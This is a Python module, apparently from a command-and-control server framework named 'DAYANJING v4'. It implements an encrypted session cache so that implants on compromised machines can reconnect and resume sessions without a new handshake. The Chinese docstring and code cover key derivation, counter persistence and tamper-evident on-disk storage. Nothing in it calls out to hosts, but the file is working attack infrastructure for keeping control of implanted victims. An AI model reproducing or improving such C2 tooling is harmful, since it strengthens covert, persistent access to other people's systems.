"""
DAYANJING v4 — 13_c2_server/session_cache.py

会话恢复缓存：允许 implant 断线重连后复用原会话，而不必重新握手。

====================================================================
被解除的限制
====================================================================
早期设想的 session_cache 直接用**服务端主密钥**加密缓存条目。这带来
一个单向致命问题：

    缓存落盘（为了跨进程/重启存活）=> 主密钥一旦泄露，
    全部历史会话密钥 + 未来所有注册派生 全部沦陷。

反过来，若缓存只放内存，则服务重启即失忆，恢复机制形同虚设。

本模块的做法是**密钥分离**：

    cache_key = HKDF(salt="dayanjing:session-cache:v1",
                     ikm=master,
                     info=b"cache-enc:v1" || server_static_id)

    - cache_key != master（单向派生，不可反推）
    - cache_key != 任何会话密钥（info 域分离，与 "session:c2s:v1"/
      "session:s2c:v1" 等标签不共享 OKM）
    - 泄露 cache_key 只能解开**缓存里已有的历史会话**，
      拿不到 master，也就派生不出任何**未来**会话
    - 泄露 master 仍需拿到缓存密文才能解历史会话（缓存可独立加密落盘）

这是"前向"与"后向"两个方向的损害隔离，缺一不可。

====================================================================
为什么恢复必须带走计数器
====================================================================
信元层 IV = pfx || counter，counter 由收发双方各自维护。
重连时若 counter 从 0 重启，而 pfx 不变（同一会话派生），
则**新旧信元在同一密钥下 IV 重用** —— GCM 的致命误用：
两条密文异或即抵消密钥流，直接泄露明文异或。

因此缓存必须保存 cell_send_ctr / cell_recv_ctr 与 seq，
恢复时**继续递增**，绝不清零。这是本模块存在的核心理由，
不只是"省一次握手"。

====================================================================
缓存条目格式（明文部分，加密前）
====================================================================
    generation(8) || k_c2s(16) || k_s2c(16)
    || seq_out(8) || seq_in(8)      # seq_in 以 +1 偏移存储（-1 记为 0）
    || cell_send_ctr(4) || cell_recv_ctr(4)
    || created_at(8)

AAD = implant_id（把条目绑定到 implant，防止跨 implant 移植条目）
"""

from __future__ import annotations

import os
import struct
import time

from crypto_layer import GCM, hkdf, hmac_sha256

CACHE_LABEL = b"dayanjing:session-cache:v1"
CACHE_INFO = b"cache-enc:v1"

_PLAIN_FMT = ">8s16s16sQQII8s"   # 与上面的字段顺序一一对应
_PLAIN_LEN = struct.calcsize(_PLAIN_FMT)   # 72

# 落盘文件格式：
#   magic(8) || ver(4) || count(4) || entries... || file_tag(16)
# 条目已各自用 cache_key 加密且 AAD 绑定 implant_id，所以单条被
# 换到另一个 implant 名下会解密失败；file_tag 额外绑定"文件整体"，
# 防止攻击者整条删除或回滚到旧快照（降级攻击）。
_FILE_MAGIC = b"DYNSCAC1"
_FILE_VER = 1
_FILE_HDR = ">8sII"
_FILE_TAG_INFO = b"cache-file-tag:v1"

DEFAULT_TTL = 24 * 3600


def derive_cache_key(master: bytes, server_static_id: bytes,
                     length: int = 32) -> bytes:
    """由主密钥单向派生缓存加密密钥。

    刻意与会话密钥派生走不同的 salt 与 info —— 域分离保证两者不可互推。
    """
    return hkdf(salt=CACHE_LABEL, ikm=master,
                info=CACHE_INFO + server_static_id, length=length)


class CacheError(Exception):
    pass


class SessionCache:
    """加密的会话恢复缓存。

    master 只在 __init__ 时用于派生 cache_key，之后**不保留** ——
    因此本对象本身被转储也不会泄露主密钥。
    """

    def __init__(self, master: bytes, server_static_id: bytes,
                 ttl: int = DEFAULT_TTL):
        if not master:
            raise CacheError("master 不能为空")
        self._key = derive_cache_key(master, server_static_id)[:16]
        self._server_static_id = server_static_id
        self._ttl = ttl
        self._entries: dict[str, bytes] = {}
        self._created: dict[str, float] = {}
        # 派生后丢弃 master 引用（Python 层面无法保证内存擦除，
        # 但至少不在对象上留一个可达引用）
        del master

    # ------------------------------------------------------------------
    # 存取
    # ------------------------------------------------------------------

    def put(self, implant_id: str, generation: int,
            k_c2s: bytes, k_s2c: bytes,
            seq_out: int, seq_in: int,
            cell_send_ctr: int, cell_recv_ctr: int) -> bytes:
        """加密写入一个会话条目，返回随机 nonce（恢复时需一并出示）。"""
        self._check_id(implant_id)
        if len(k_c2s) != 16 or len(k_s2c) != 16:
            raise CacheError("会话密钥必须为 16 字节")
        if k_c2s == k_s2c:
            raise CacheError("拒绝退化会话：k_c2s == k_s2c")

        now = time.time()
        plain = struct.pack(
            _PLAIN_FMT,
            generation.to_bytes(8, "big"),
            k_c2s, k_s2c,
            seq_out & 0xFFFFFFFFFFFFFFFF,
            # seq_in 允许 -1（尚未收到上行帧）。直接 & mask 会变成 2**64-1，
            # 恢复时用它重建重放窗口会试图枚举天文数字区间 —— 故 +1 偏移存：
            # 0 表示"未收到"，读回时减 1 还原。
            (seq_in + 1) & 0xFFFFFFFFFFFFFFFF,
            cell_send_ctr & 0xFFFFFFFF,
            cell_recv_ctr & 0xFFFFFFFF,
            struct.pack(">d", now),
        )
        nonce = os.urandom(12)
        g = GCM(self._key)
        ct, tag = g.encrypt(nonce, plain, implant_id.encode("utf-8"))
        self._entries[implant_id] = nonce + tag + ct
        self._created[implant_id] = now
        return nonce

    def get(self, implant_id: str) -> dict | None:
        """取出并解密一个会话条目；不存在或已过期返回 None。

        任何解密失败（篡改、密钥不符、AAD 不符）一律抛 CacheError，
        绝不返回半解出的数据。
        """
        self._check_id(implant_id)
        blob = self._entries.get(implant_id)
        if blob is None:
            return None
        if time.time() - self._created[implant_id] > self._ttl:
            self.drop(implant_id)
            return None

        nonce, tag, ct = blob[:12], blob[12:28], blob[28:]
        g = GCM(self._key)
        try:
            plain = g.decrypt(nonce, ct, implant_id.encode("utf-8"), tag)
        except Exception as exc:  # noqa: BLE001 - 任何失败都不得降级为可用
            raise CacheError(f"会话条目解密失败: {exc}") from exc
        if len(plain) != _PLAIN_LEN:
            raise CacheError("会话条目长度不符")

        (gen_raw, k_c2s, k_s2c, seq_out, seq_in,
         send_ctr, recv_ctr, ts_raw) = struct.unpack(_PLAIN_FMT, plain)

        return {
            "implant_id": implant_id,
            "generation": int.from_bytes(gen_raw, "big"),
            "k_c2s": k_c2s,
            "k_s2c": k_s2c,
            "seq_out": seq_out,
            "seq_in": seq_in - 1,   # 还原 +1 偏移：0 -> -1（未收到）
            "cell_send_ctr": send_ctr,
            "cell_recv_ctr": recv_ctr,
            "created_at": struct.unpack(">d", ts_raw)[0],
        }

    # ------------------------------------------------------------------
    # 落盘：跨进程持久化
    # ------------------------------------------------------------------

    def _file_tag_key(self) -> bytes:
        """文件整体校验用的密钥，与条目加密密钥域分离。"""
        return hkdf(salt=CACHE_LABEL, ikm=self._key,
                    info=_FILE_TAG_INFO + self._server_static_id,
                    length=16)

    def save(self, path: str) -> int:
        """把全部条目落盘，返回写入条目数。

        文件带整体 MAC：只改一条、删一条、或用旧快照整体替换，都会在
        load 时被检出。注意它挡不住"持有主密钥者重新签一份" —— 那已超出
        本层威胁模型（拿到主密钥等于拿到一切）。
        """
        body = bytearray()
        n = 0
        for implant_id, blob in sorted(self._entries.items()):
            idb = implant_id.encode("utf-8")
            body += struct.pack(">H", len(idb)) + idb
            body += struct.pack(">d", self._created[implant_id])
            body += struct.pack(">I", len(blob)) + blob
            n += 1

        hdr = struct.pack(_FILE_HDR, _FILE_MAGIC, _FILE_VER, n)
        tag = hmac_sha256(self._file_tag_key(), hdr + bytes(body))[:16]

        tmp = path + ".tmp"
        with open(tmp, "wb") as f:
            f.write(hdr + bytes(body) + tag)
            f.flush()
            os.fsync(f.fileno())
        os.replace(tmp, path)      # 原子替换：崩溃不会留下半截文件
        return n

    def load(self, path: str) -> int:
        """从磁盘恢复条目，返回恢复条目数。文件不存在返回 0。

        整体 MAC 校验失败抛 CacheError —— 绝不部分加载：半份缓存会让
        "哪些会话能恢复"变成不可预测状态，比全部丢失更危险。
        """
        if not os.path.exists(path):
            return 0
        with open(path, "rb") as f:
            raw = f.read()
        if len(raw) < struct.calcsize(_FILE_HDR) + 16:
            raise CacheError("缓存文件过短")

        hdr_len = struct.calcsize(_FILE_HDR)
        hdr, body, tag = raw[:hdr_len], raw[hdr_len:-16], raw[-16:]
        magic, ver, n = struct.unpack(_FILE_HDR, hdr)
        if magic != _FILE_MAGIC:
            raise CacheError("缓存文件 magic 不符")
        if ver != _FILE_VER:
            raise CacheError(f"不支持的缓存文件版本 {ver}")
        if hmac_sha256(self._file_tag_key(), hdr + body)[:16] != tag:
            raise CacheError("缓存文件整体校验失败（被篡改或回滚）")

        off = 0
        restored = 0
        for _ in range(n):
            if off + 2 > len(body):
                raise CacheError("缓存文件条目头截断")
            (id_len,) = struct.unpack(">H", body[off:off + 2]); off += 2
            if off + id_len > len(body):
                raise CacheError("缓存文件 implant_id 截断")
            implant_id = body[off:off + id_len].decode("utf-8"); off += id_len
            if off + 8 > len(body):
                raise CacheError("缓存文件时间戳截断")
            (created,) = struct.unpack(">d", body[off:off + 8]); off += 8
            if off + 4 > len(body):
                raise CacheError("缓存文件长度字段截断")
            (blen,) = struct.unpack(">I", body[off:off + 4]); off += 4
            if off + blen > len(body):
                raise CacheError("缓存文件条目体截断")
            blob = bytes(body[off:off + blen]); off += blen

            self._check_id(implant_id)
            self._entries[implant_id] = blob
            self._created[implant_id] = created
            restored += 1

        if off != len(body):
            raise CacheError("缓存文件尾部有多余字节")
        return restored

    def drop(self, implant_id: str) -> None:
        self._entries.pop(implant_id, None)
        self._created.pop(implant_id, None)

    def sweep(self) -> int:
        """清掉过期条目，返回清理数量。"""
        now = time.time()
        dead = [i for i, t in self._created.items() if now - t > self._ttl]
        for i in dead:
            self.drop(i)
        return len(dead)

    def __len__(self) -> int:
        return len(self._entries)

    # ------------------------------------------------------------------

    @staticmethod
    def _check_id(implant_id: str) -> None:
        if not implant_id:
            raise CacheError("implant_id 不能为空")
        if "/" in implant_id or "\\" in implant_id or ".." in implant_id:
            raise CacheError("implant_id 含非法字符")
